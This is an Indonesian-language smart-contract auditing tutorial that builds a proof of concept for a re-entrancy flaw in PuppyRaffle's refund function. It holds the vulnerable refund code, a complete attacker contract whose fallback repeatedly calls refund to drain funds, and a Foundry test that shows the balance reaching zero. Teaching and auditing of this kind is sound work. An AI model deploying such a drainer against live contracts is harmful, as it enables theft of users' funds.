# PoC: Re-entrancy pada PuppyRaffle

## Pendahuluan

Setelah memahami teori Re-entrancy, kita akan mempraktikkannya langsung pada fungsi `refund` di protokol `PuppyRaffle`. Kita akan membangun sebuah **Proof of Concept (PoC)** untuk membuktikan bahwa fungsi ini benar-benar rentan dan dapat menyebabkan kerugian dana bagi protokol.

---

## 1. Titik Kerentanan: Fungsi `refund`

Jika kita perhatikan kode pada `PuppyRaffle.sol`, fungsi `refund` melakukan pengiriman dana (`sendValue`) *sebelum* ia menghapus pemain dari array `players`.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    // ... require statements ...

    // ❌ INTERACTION: Mengirim dana kembali ke user
    payable(msg.sender).sendValue(entranceFee);

    // ❌ EFFECTS: Baru mengupdate state (Terlambat!)
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

---

## 2. Membangun Kontrak Penyerang (`ReentrancyAttacker`)

Untuk mengeksploitasi ini, kita membutuhkan kontrak yang memiliki fungsi `fallback` atau `receive` untuk memanggil kembali fungsi `refund`.

### Logika Serangan:
1.  **Attack**: Penyerang masuk ke raffle, mendapatkan index-nya, lalu memanggil `refund`.
2.  **Receive/Fallback**: Saat menerima dana dari `refund`, kontrak penyerang memanggil kembali `refund` selama saldo `PuppyRaffle` masih mencukupi.

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable { _stealMoney(); }
    receive() external payable { _stealMoney(); }
}
```

---

## 3. Menulis Test PoC di Foundry

Kita menambahkan test case `test_reentrancyRefund` di `PuppyRaffle.t.sol` untuk mensimulasikan serangan secara otomatis.

### Langkah-langkah Test:
1.  Empat pemain masuk ke raffle (Saldo protokol = 4 * entranceFee).
2.  Deploy kontrak `ReentrancyAttacker`.
3.  Panggil `attackerContract.attack()`.
4.  Bandingkan saldo sebelum dan sesudah serangan.

```javascript
function test_reentrancyRefund() public {
    // 1. Setup pemain asli
    address[] memory players = new address[](4);
    // ... fill players ...
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    // 2. Setup Penyerang
    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    // 3. Eksekusi Serangan
    vm.prank(attacker);
    attackerContract.attack{value: entranceFee}();

    // 4. Verifikasi Dampak
    console.log("Ending puppyRaffle balance: ", address(puppyRaffle).balance);
    console.log("Ending attackerContract balance: ", address(attackerContract).balance);
    
    assertEq(address(puppyRaffle).balance, 0); // Protokol harusnya ludes
}
```

---

## 4. Hasil & Kesimpulan

-   **Drained!**: Dengan menjalankan `forge test --mt test_reentrancyRefund -vvv`, kita akan melihat saldo `PuppyRaffle` menjadi **0**.
-   **Severity: High/Critical**: Karena penyerang bisa mencuri seluruh dana dalam protokol, temuan ini dikategorikan sebagai risiko tingkat tinggi.
-   **Validasi**: PoC ini membuktikan secara empiris bahwa laporan audit kita valid dan bukan sekadar asumsi.

---
*Selamat! Anda telah berhasil membuktikan eksploitasi re-entrancy pada protokol nyata. Ini adalah skill krusial bagi seorang Security Researcher.*
